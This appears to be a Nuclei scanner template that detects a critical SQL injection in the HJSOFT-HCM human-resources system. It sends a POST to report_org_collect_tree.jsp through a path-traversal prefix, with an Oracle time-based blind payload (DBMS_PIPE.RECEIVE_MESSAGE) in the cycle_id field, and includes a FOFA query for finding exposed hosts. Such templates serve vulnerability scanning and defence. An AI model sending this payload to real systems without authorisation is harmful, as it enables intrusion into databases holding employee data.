id: hjsoft-hcm-report-org-collect-tree-sqli

info:
  name: HJSOFT-HCM report_org_collect_tree.jsp - SQL Injection
  author: Xc1Ym
  severity: critical
  metadata:
    verified: true
    max-request: 1
    fofa-query: title="人力资源信息管理系统",app="HJSOFT-HCM"
  tags: HJSoft-HCM

http:
  - method: POST
    path:
      - "{{RootURL}}/templates/attestation/../../report/report_collect/report_org_collect_tree.jsp"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "params=&isAction=2&cycle_id=2 AND 3959=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)||CHR(118)||CHR(122)||CHR(105),5)"

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - duration>=5
        condition: and
